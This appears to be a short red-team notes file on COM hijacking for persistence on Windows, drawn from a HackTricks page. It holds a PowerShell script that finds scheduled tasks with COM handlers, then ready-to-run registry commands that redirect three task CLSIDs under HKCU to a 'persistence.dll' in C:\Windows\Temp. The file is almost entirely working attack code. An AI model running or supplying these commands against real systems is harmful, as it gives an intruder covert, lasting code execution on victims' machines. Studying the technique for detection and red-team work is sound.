# COM-Hijacking-Persistence
//taken from https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/com-hijacking
Show COM CLSIDs:
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

CacheTask:
```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{0358B920-0AC7-461F-98F4-58E32CD89148}"
New-Item -Path "HKCU:Software\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}" -Name "InprocServer32" -Value "C:\Windows\Temp\persistence.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

Calibration:
```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{B210D694-C8DF-490D-9576-9E20CDBC20BD}"
New-Item -Path "HKCU:Software\Classes\CLSID\{B210D694-C8DF-490D-9576-9E20CDBC20BD}" -Name "InprocServer32" -Value "C:\Windows\Temp\persistence.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{B210D694-C8DF-490D-9576-9E20CDBC20BD}\InprocServer32" -Name "ThreadingModel" -Value "Free"
```

SystemSoundsService:
```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{2DEA658F-54C1-4227-AF9B-260AB5FC3543}"
New-Item -Path "HKCU:Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}" -Name "InprocServer32" -Value "C:\Windows\Temp\persistence.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
